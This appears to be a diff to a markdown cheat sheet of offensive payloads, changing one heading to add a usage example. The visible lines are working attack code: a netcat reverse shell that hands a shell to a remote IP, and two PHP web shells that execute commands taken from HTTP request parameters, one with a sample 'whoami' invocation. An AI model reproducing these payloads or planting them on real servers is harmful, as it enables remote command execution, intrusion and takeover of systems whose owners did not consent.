@@ -111,7 +111,7 @@ nc.exe 10.10.10.10 9001 -e sh
 <?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
 ```
 
-### PHP WebShell 3
+### PHP WebShell 3 (domain/shell.php?0=whoami)
 ```php
 <?=`$_GET[0]`?>
 ```
